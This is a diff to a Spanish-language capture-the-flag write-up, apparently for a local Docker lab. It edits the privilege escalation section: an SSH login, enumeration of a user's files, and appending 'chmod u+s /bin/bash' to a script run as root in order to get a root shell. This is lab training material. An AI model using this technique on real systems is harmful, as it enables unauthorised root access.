@@ -169,22 +169,28 @@ Una vez dentro obtenemos usuario y contraesña.
 
 # Escalada de Privilegios
 
-Nos conectamos al host mediante ssh con las credenciales y empezamos a enumerar el entorno.
+Nos conectamos al host mediante ssh con las credenciales encontradas y empezamos a enumerar el entorno.
 
-![ssh_enum]()
 ~~~
 ssh penguin@172.17.0.2
 ~~~
 
-Enumeramos un poco y vemos dos archivos en el directorio del usuario Penguin.
-
-![files]()
+Sin ir muy lejos, vemos dos archivos en el directorio del usuario Penguin, y como vemos, el script se está ejecutando como root. 
+Veamos que contienen.
 
 ~~~
 ls -lah
+cat archivo.txt
+cat script.sh
 ~~~
+![files]()
 
+Lo unico que tenemos que hacer es modificar el script para que nos devuelva una shell como root al ejecutarlo.
 
+~~~
+echo 'chmod u+s /bin/bash' >> script.sh
+~~~
+![echo]()
 
 
 
